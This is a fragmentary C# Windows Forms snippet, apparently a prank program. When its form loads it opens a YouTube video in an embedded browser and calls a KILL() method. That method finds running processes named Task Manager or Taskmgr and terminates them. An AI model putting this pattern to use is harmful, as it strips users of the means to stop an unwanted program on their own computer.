...
namespace ChaoCau
{
    public partial class Form1 : Form
    {
        ...
        {
            webBrowser1.Navigate($"https://www.youtube.com/watch?v=4wy_O5FTsUE?version=3");
            KILL();
        }
        ...
        public static void KILL()
        {
            ...
            {
                if (pro[i].ProcessName == "Taskmgr" || pro[i].ProcessName == "TaskMgr" || pro[i].ProcessName == "taskmgr"||pro[i].ProcessName == "Task Manager")
                    pro[i].Kill();               
            }
        }
        private int t;
